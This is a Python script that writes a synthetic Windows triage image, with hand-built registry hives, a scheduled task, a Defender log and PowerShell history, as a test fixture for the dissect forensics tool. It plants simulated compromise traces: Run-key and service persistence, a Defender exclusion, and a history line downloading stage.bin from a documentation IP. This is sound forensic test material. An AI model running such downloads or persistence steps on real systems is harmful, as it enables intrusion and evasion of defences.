"""A synthetic Windows triage collection, laid out like a drive, that dissect will open as a target.

Nothing here is collected evidence. The registry hives are written from scratch with the same
structures dissect.regf reads, which is what makes the fixture useful: the parsers under test run
the real code paths, not a mock.

    python samples/synthetic/triage_fixture.py <output dir>
"""

from __future__ import annotations

import os
import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from native_artifacts import STAMP, prefetch_bytes  # noqa: E402

FILETIME = (STAMP + 11644473600000) * 10000

REG_SZ, REG_EXPAND_SZ, REG_BINARY, REG_DWORD, REG_MULTI_SZ = 1, 2, 3, 4, 7
VALUES = "__values__"


class HiveWriter:
    """Serialise a nested dict into a registry hive file.

    Keys are dict entries; a key's values live under the "__values__" entry as name -> value, where
    a str is REG_SZ, an int is REG_DWORD, bytes are REG_BINARY, a list of str is REG_MULTI_SZ and
    a (type, value) tuple sets the type explicitly (for REG_EXPAND_SZ).
    """

    def __init__(self) -> None:
        from dissect.regf.c_regf import c_regf

        self.c = c_regf
        self.buf = bytearray()
        self.fixups: list[tuple[int, int]] = []  # (child nk cell offset, parent nk cell offset) patched at the end

    # ---- cells --------------------------------------------------------------------------------
    def cell(self, payload: bytes) -> int:
        """Append an allocated cell and return its offset relative to the first hbin."""
        size = (len(payload) + 4 + 7) & ~7
        offset = len(self.buf)
        self.buf += struct.pack("<i", -size) + payload.ljust(size - 4, b"\0")
        return offset

    def encode(self, value) -> tuple[int, bytes]:
        if isinstance(value, tuple):
            kind, raw = value
            if kind in (REG_SZ, REG_EXPAND_SZ):
                return kind, str(raw).encode("utf-16-le") + b"\0\0"
            return kind, raw if isinstance(raw, bytes) else bytes(raw)
        if isinstance(value, bool):
            return REG_DWORD, struct.pack("<I", int(value))
        if isinstance(value, int):
            return REG_DWORD, struct.pack("<I", value & 0xFFFFFFFF)
        if isinstance(value, bytes):
            return REG_BINARY, value
        if isinstance(value, list):
            return REG_MULTI_SZ, b"".join(str(s).encode("utf-16-le") + b"\0\0" for s in value) + b"\0\0"
        return REG_SZ, str(value).encode("utf-16-le") + b"\0\0"

    def value(self, name: str, value) -> int:
        kind, data = self.encode(value)
        if len(data) <= 4:
            length = len(data) | 0x80000000
            data_ref = struct.unpack("<I", data.ljust(4, b"\0"))[0]
        else:
            length = len(data)
            data_ref = self.cell(data)
        vk = self.c._CM_KEY_VALUE(
            Signature=b"vk",
            NameLength=len(name),
            DataLength=length,
            Data=data_ref,
            Type=kind,
            Flags=self.c.VALUE(1),  # COMP_NAME: the name is ASCII
            Spare=0,
        ).dumps()
        return self.cell(vk + name.encode("latin-1"))

    def key(self, name: str, tree: dict, root: bool = False) -> int:
        values = tree.get(VALUES, {})
        value_cells = [self.value(vname, v) for vname, v in values.items()]
        value_list = self.cell(struct.pack(f"<{len(value_cells)}I", *value_cells)) if value_cells else 0xFFFFFFFF
        children = [(sub, self.key(sub, subtree)) for sub, subtree in tree.items() if sub != VALUES]
        if children:
            index = self.c._CM_KEY_INDEX(Signature=b"li", Count=len(children), List=[off for _, off in children]).dumps()
            subkey_list = self.cell(index)
        else:
            subkey_list = 0xFFFFFFFF
        flags = self.c.KEY.COMP_NAME | (self.c.KEY.HIVE_ENTRY if root else 0)
        nk = self.c._CM_KEY_NODE(
            Signature=b"nk",
            Flags=flags,
            LastWriteTime=FILETIME,
            Spare=0,
            Parent=0xFFFFFFFF if root else 0,
            SubKeyCounts=[len(children), 0],
            SubKeyLists=[subkey_list, 0xFFFFFFFF],
            ValueList=self.c._CHILD_LIST(Count=len(value_cells), List=value_list),
            Security=0xFFFFFFFF,
            Class=0xFFFFFFFF,
            MaxNameLen=max((len(s) for s, _ in children), default=0) * 2,
            MaxClassLen=0,
            MaxValueNameLen=max((len(v) for v in values), default=0) * 2,
            MaxValueDataLen=64,
            WorkVar=0,
            NameLength=len(name),
            ClassLength=0,
        ).dumps()
        offset = self.cell(nk + name.encode("latin-1"))
        for _, child in children:
            self.fixups.append((child, offset))
        return offset

    def build(self, tree: dict, root_name: str = "ROOT") -> bytes:
        from dissect.regf.regf import xor32_crc

        # Cell offsets are relative to the start of the first hbin, whose 32-byte header comes
        # first, so the buffer begins with room for that header and the cells follow it.
        self.buf = bytearray(32)
        self.fixups = []
        root = self.key(root_name, tree, root=True)
        for child, parent in self.fixups:
            struct.pack_into("<I", self.buf, child + 4 + 16, parent)  # Parent sits 16 bytes into the node, after the size prefix
        hbin_size = (len(self.buf) + 4095) & ~4095
        struct.pack_into("<IIIIIQI", self.buf, 0, 0x6E696268, 0, hbin_size, 0, 0, 0, 0)
        hbin = bytes(self.buf).ljust(hbin_size, b"\0")
        header = self.c._HBASE_BLOCK(Signature=0x66676572, Sequence1=1, Sequence2=1, Major=1, Minor=5, RootCell=root, Length=hbin_size, Cluster=1)
        header.CheckSum = xor32_crc(header.dumps()[:508])
        return header.dumps() + hbin


def build_hive(tree: dict, root_name: str = "ROOT") -> bytes:
    return HiveWriter().build(tree, root_name)


# ---- the collection --------------------------------------------------------------------------
HOST = "WS01"
USER_SID = "S-1-5-21-1000-2000-3000-1001"

SYSTEM = {
    "Select": {VALUES: {"Current": 1, "Default": 1}},
    "ControlSet001": {
        "Control": {
            "Session Manager": {"Environment": {VALUES: {"windir": (REG_EXPAND_SZ, "C:\\Windows"), "SystemRoot": (REG_EXPAND_SZ, "C:\\Windows")}}},
            "ComputerName": {"ComputerName": {VALUES: {"ComputerName": HOST}}},
        },
        "Services": {
            "Spooler": {
                VALUES: {
                    "ImagePath": (REG_EXPAND_SZ, "%SystemRoot%\\System32\\spoolsv.exe"),
                    "DisplayName": "Print Spooler",
                    "ObjectName": "LocalSystem",
                    "Start": 2,
                    "Type": 0x10,
                }
            },
            "SyncHelper": {
                VALUES: {
                    "ImagePath": "C:\\Users\\Public\\svc.exe -k",
                    "DisplayName": "Sync Helper",
                    "ObjectName": "LocalSystem",
                    "Start": 2,
                    "Type": 0x10,
                }
            },
        },
    },
}

SOFTWARE = {
    "Microsoft": {
        "Windows": {
            "CurrentVersion": {
                "Run": {
                    VALUES: {
                        "SecurityHealth": (REG_EXPAND_SZ, "%windir%\\system32\\SecurityHealthSystray.exe"),
                        "Dropper": '"C:\\Users\\Public\\svc.exe" -k',
                    }
                },
            }
        },
        "Windows NT": {
            "CurrentVersion": {
                VALUES: {"ProductName": "Windows 10 Pro", "SystemRoot": "C:\\Windows", "CurrentVersion": "6.3", "CurrentBuild": "19045"},
                "ProfileList": {USER_SID: {VALUES: {"ProfileImagePath": (REG_EXPAND_SZ, "C:\\Users\\jdoe")}}},
            }
        },
        # an exclusion is what unwanted software adds first; it is also one of the things that
        # tells dissect the Defender plugin applies to this collection
        "Windows Defender": {"Exclusions": {"Paths": {VALUES: {"C:\\Users\\jdoe\\AppData\\Local\\Temp": 0}}}},
    }
}

NTUSER = {
    "Software": {
        "Microsoft": {
            "Windows": {
                "CurrentVersion": {
                    "Run": {VALUES: {"Updater": "C:\\Users\\jdoe\\AppData\\Roaming\\upd.exe /silent"}},
                }
            }
        }
    }
}

TASK_XML = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2026-09-01T10:00:00</Date>
    <Author>WS01\\jdoe</Author>
    <URI>\\Updater</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>WS01\\jdoe</UserId>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-21-1000-2000-3000-1001</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Enabled>true</Enabled>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\\Users\\jdoe\\AppData\\Roaming\\upd.exe</Command>
      <Arguments>/silent</Arguments>
    </Exec>
  </Actions>
</Task>
"""

# A resource-scan block carries its timestamp on the opening line only; the lines inside are bare.
MPLOG = "\n".join(
    [
        "2026-08-19T01:34:26.112Z Begin Resource Scan",
        "Scan ID:{6E2B0E9A-0000-0000-0000-000000000001}",
        "Scan Source:3",
        "Start Time:08-19-2026 01:34:26",
        "End Time:08-19-2026 01:34:27",
        "Explain: real-time scan of a downloaded file",
        "Resource Schema:file",
        "Resource Path:C:\\Users\\jdoe\\Downloads\\invoice.pdf.exe",
        "Result Count:1",
        "Threat Name:Trojan:Win32/Synthetic.A!ml",
        "ID:2147900001",
        "Severity:5",
        "Number of Resources:1",
        "Resource Schema:file",
        "Resource Path:C:\\Users\\jdoe\\Downloads\\invoice.pdf.exe",
        "Extended Info:0",
        "End Scan",
        "2026-08-19T01:34:27.500Z DETECTION_ADD#1 Trojan:Win32/Synthetic.A!ml file:C:\\Users\\jdoe\\Downloads\\invoice.pdf.exe",
        "2026-08-19T01:34:28.000Z DETECTIONEVENT MPSOURCE_REALTIME HackTool:Win32/Synthetic.B file:C:\\Users\\Public\\tool.exe",
        "2026-08-19T01:34:29.000Z [Exclusion] C:\\Users\\jdoe\\AppData\\Local\\Temp -> \\Device\\HarddiskVolume3\\Users\\jdoe\\AppData\\Local\\Temp",
        "",
    ]
)


def write_triage(root: str | os.PathLike) -> Path:
    """Write the collection under root/C/... and return the root, which Target.open accepts."""
    base = Path(root)
    drive = base / "C"
    config = drive / "Windows" / "System32" / "config"
    config.mkdir(parents=True, exist_ok=True)
    (config / "SYSTEM").write_bytes(build_hive(SYSTEM, "CMI-CreateHive{SYSTEM}"))
    (config / "SOFTWARE").write_bytes(build_hive(SOFTWARE, "CMI-CreateHive{SOFTWARE}"))
    (drive / "Windows" / "Prefetch").mkdir(parents=True, exist_ok=True)
    (drive / "Windows" / "Prefetch" / "POWERSHELL.EXE-1A2B3C4D.pf").write_bytes(prefetch_bytes())
    # the event log directory is one of the places dissect looks before it considers Defender present
    logs = drive / "Windows" / "System32" / "winevt" / "Logs"
    logs.mkdir(parents=True, exist_ok=True)
    (logs / ".keep").write_bytes(b"")
    tasks = drive / "Windows" / "System32" / "Tasks"
    tasks.mkdir(parents=True, exist_ok=True)
    (tasks / "Updater").write_bytes(TASK_XML.encode("utf-16"))
    support = drive / "ProgramData" / "Microsoft" / "Windows Defender" / "Support"
    support.mkdir(parents=True, exist_ok=True)
    (support / "MPLog-20260819-013426.log").write_bytes(MPLOG.encode("utf-16"))  # with its byte order mark, as Defender writes it
    user = drive / "Users" / "jdoe"
    user.mkdir(parents=True, exist_ok=True)
    (user / "NTUSER.DAT").write_bytes(build_hive(NTUSER, "CMI-CreateHive{NTUSER}"))
    history = user / "AppData" / "Roaming" / "Microsoft" / "Windows" / "PowerShell" / "PSReadLine"
    history.mkdir(parents=True, exist_ok=True)
    (history / "ConsoleHost_history.txt").write_text("Get-Process\nInvoke-WebRequest http://198.51.100.7/stage.bin -OutFile $env:TEMP\\stage.bin\n", encoding="utf-8")
    return base


if __name__ == "__main__":
    out = write_triage(sys.argv[1] if len(sys.argv) > 1 else "samples/generated/triage")
    print(f"wrote synthetic triage under {out}")
